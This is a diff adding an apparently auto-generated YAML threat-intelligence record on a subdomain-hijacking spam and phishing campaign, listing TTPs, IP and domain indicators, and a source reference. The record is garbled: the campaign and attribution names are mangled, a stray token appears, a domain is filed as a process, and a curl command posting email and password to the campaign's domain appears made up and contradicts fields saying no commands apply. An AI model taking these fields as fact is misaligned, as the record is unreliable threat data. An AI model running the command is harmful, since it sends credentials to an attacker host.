@@ -1,0 +1,48 @@
+description: ASubdoMailinga is a campaign of subdomain hijacking that compromises
+  reputable domains and sends malicious emails using their brand names, leading to
+  the distribution of spam and phishing attacks.
+attribution: ResurrecAd.
+malware_families: Not applicable, as this report focuses on subdomain hijacking and
+  email fraud.
+TTPs:
+  processes:
+  - msnmarthastewartsweeps.com
+  commandline:
+  - 'curl -X POST -H ''Content-Type: application/json'' -d ''{"email":"$email", "password":"$password"}''
+    https://www.msnmarthastewartsweeps.com/api/v1/login'
+  powershell: Not applicable, as the TTPs are not actual commands or process execution<s>\\
+  scripting_engine: Not applicable, as the TTPs are not actual scripts or code executions.
+  registry_keys: Not applicable, as the TTPs are not actual Windows Registry modifications.
+  image_load: Not applicable, as the TTPs are not actual process injections or DLL
+    loading.
+  network_connections:
+  - 'curl -X POST -H ''Content-Type: application/json'' -d ''{"email":"$email", "password":"$password"}''
+    https://www.msnmarthastewartsweeps.com/api/v1/login'
+  file_activity: Not applicable, as the TTPs are not actual file creations, accesses,
+    or modifications.
+  persistence: Not applicable, as the TTPs are not actual persistence methods.
+  pipes: Not applicable, as the TTPs are not actual named pipe usage.
+  process_relations: Not applicable, as the TTPs are not actual process trees.
+IOCs:
+- CNAME-hijacked subdomains, such as marthastewart.msn.com
+- SPF-hijacked domains, such as healthylifes.uk.com
+- Compromised IP addresses, such as 62.244.33.18
+- msnmarthastewartsweeps.com
+- 51.81.215.32
+- 75.102.62.10
+- 75.102.62.11
+- 98.159.237.2
+- 104.223.43.169
+- 104.223.43.170
+- 104.223.43.171
+- 195.78.51.100
+- 142.112.0.138
+- 142.112.0.139
+- 142.112.0.140
+- 2a01:7600::f03c:91f:fe84:6b60
+authors:
+- Nati Tal
+- Oleg Zaytsev
+reference: https://guard.io/labs/subdomailing-thousands-of-hijacked-major-brand-subdomains-found-bombarding-users-with-millions
+date_of_publication: February 26, 2024
+file_creation_date: June 26, 2025
